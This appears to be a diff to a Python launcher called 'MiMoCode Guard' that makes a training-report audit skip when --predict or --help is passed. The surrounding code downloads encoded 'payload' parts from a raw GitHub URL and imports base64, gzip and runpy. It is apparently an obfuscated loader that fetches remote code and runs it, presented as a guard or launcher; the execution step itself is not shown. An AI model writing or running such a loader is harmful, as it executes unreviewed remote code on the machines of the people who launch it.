@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """MiMoCode Guard 1.2 launcher with an integrated pre-training report audit."""
 from __future__ import annotations
-import base64, collections, gzip, hashlib, json, os, runpy, urllib.request
+import base64, collections, gzip, hashlib, json, os, runpy, sys, urllib.request
 from pathlib import Path
 
 BASE_URL = "https://raw.githubusercontent.com/p5i6/mimocode-guard/main/payload/"
@@ -74,7 +74,9 @@ def audit_reports():
     print("[MiMoCode Guard] Report integrity passed. Continuing to training.", flush=True)
 
 def main():
-    audit_reports()
+    # Inference and help should not depend on the training-report service.
+    if "--predict" not in sys.argv and "--help" not in sys.argv and "-h" not in sys.argv:
+        audit_reports()
     encoded_parts = []
     for name in PARTS:
         request = urllib.request.Request(BASE_URL + name, headers={"User-Agent":"MiMoCode-Guard/1.2"})
